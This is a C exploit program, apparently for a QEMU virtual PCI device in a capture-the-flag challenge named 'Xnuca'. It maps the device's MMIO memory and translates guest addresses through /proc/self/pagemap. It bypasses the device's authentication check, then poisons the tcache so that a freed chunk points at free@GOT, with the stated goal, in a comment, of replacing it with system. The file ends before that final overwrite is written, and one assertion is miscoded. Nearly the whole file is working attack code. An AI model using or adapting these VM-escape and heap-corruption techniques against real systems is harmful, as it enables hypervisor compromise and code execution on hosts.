#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/io.h>

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

int fd, mmio_fd;
void *mmio_mem;

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    uint64_t pme, gfn;
    size_t offset;

    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;

    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

int init_mmio() {

    mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd < 0) {
        perror("open pci");
        return -1;
    }

    mmio_mem = mmap(0, 0x10000000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem < 0) {
        perror("mmap mmio_mem");
        return -1;
    }
    printf("mmio_mem: 0x%lx\n", (size_t) mmio_mem);

    return 0;
}

/* MMIO */
void set_timer() {
    int addr = 0x20;
    *(uint32_t *)((uint8_t *) mmio_mem + addr) = 0xcafebabe;
}

void send_req(int offset, int choice, int size, int val) {
    int addr = 0x30;
    addr = addr | (offset << 0x8) | (choice << 0xc) | (size << 0x10);
    *(uint32_t *)((uint8_t *) mmio_mem + addr) = val;
}

void auth(int val) {
    int addr = 0x10;
    *(uint32_t *)((uint8_t *) mmio_mem + addr) = val;
}

uint32_t get_cnt() {
    return *(uint32_t *)((uint8_t *) mmio_mem + 0x10);
}

uint32_t get_state() {
    return *(uint32_t *)((uint8_t *) mmio_mem + 0x20);
}

void add(int offset, int size) {
    assert(get_state() & 0x5 == 0x5);
    send_req(offset, 0x1, size, 0xcafebabe);
    set_timer();
    sleep(0x1);
}

void edit(int offset, int size, int val) {
    assert(get_state() & 0x5 == 0x5);
    send_req(offset, 0x2, size, val);
    set_timer();
    sleep(0x1);
}

void del(int offset) {
    assert(get_state() & 0x5 == 0x5);
    send_req(offset, 0x3, 0xcafebabe, 0xcafebabe);
    set_timer();
    sleep(0x1);
}

int main() {
    int r = 0;
    void *userbuf;
    uint64_t phy_userbuf;

    fd = open("/proc/self/pagemap", O_RDONLY);
    if (!fd) {
        perror("open pagemap");
        return -1;
    }

    /* init MMIO */
    r = init_mmio();
    if (r == -1) {
        perror("init mmio");
        return -1;
    }

    /* allocate a user buffer */
    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (userbuf == MAP_FAILED) {
        perror("mmap userbuf");
        return -1;
    }
    mlock(userbuf, 0x1000);
    phy_userbuf = gva_to_gpa(userbuf);
    printf("userbuf: 0x%lx\n", (uint64_t) userbuf);
    printf("phy_userbuf: 0x%lx\n", phy_userbuf);

    /*
     * for DEBUG:
     * state addr = 0x278e9b0
     */

    /* bypass state check */
    char authStr[] = "Xnuca";
    printf("cnt = %d\n", get_cnt());
    printf("state = %d\n", get_state());
    for (int i = 0; i < 5; i++) {
        auth(authStr[i]);
        printf("cnt = %d\n", get_cnt());
        printf("state = %d\n", get_state());
    }

    uint64_t system_plt = 0x411420;
    printf("system_plt: 0x%lx\n", system_plt);
    uint64_t free_got = 0x11b92c8;
    printf("free_got: 0x%lx\n", free_got);
    /* free a chunk (0x70) and edit fd */
    add(0x0, 0x68);
    del(0x0); /* put into tcache */
    edit(0x0, 0x0, free_got - 0x10);

    /* get free_got and change to system */

    close(fd);
    close(mmio_fd);

    return 0;
}
